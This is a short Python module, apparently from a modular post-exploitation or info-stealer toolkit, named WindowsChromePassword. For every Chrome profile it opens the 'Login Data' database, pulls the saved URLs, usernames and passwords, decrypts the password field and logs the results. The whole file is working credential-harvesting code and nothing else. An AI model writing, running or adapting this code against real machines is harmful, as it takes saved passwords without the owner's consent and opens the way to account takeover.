# coding: utf-8

try:
	import os
	import sqlite3
	import win32crypt
except ImportError:
	pass

from modules.windows.chrome.chrome_module import ChromeModule


class WindowsChromePassword(ChromeModule):
	def __init__(self):
		ChromeModule.__init__(
			self,
			name='WindowsChromePassword',
			version='0.1.0',
			file=__file__,
			dependencies=['os', 'sqlite3', 'win32crypt'],
		)

	def execute(self) -> bool:
		if not super().execute():
			return False

		for profile in self.get_profiles():
			password_path = profile + '\\Login Data'
			if os.path.isfile(password_path):
				connection = sqlite3.connect(password_path)
				cursor = connection.cursor()
				self.cursor_get_and_log(cursor, 'action_url, username_value, password_value', 'logins', decrypt_ids=[2], spe=os.path.split(profile)[1])

		return True
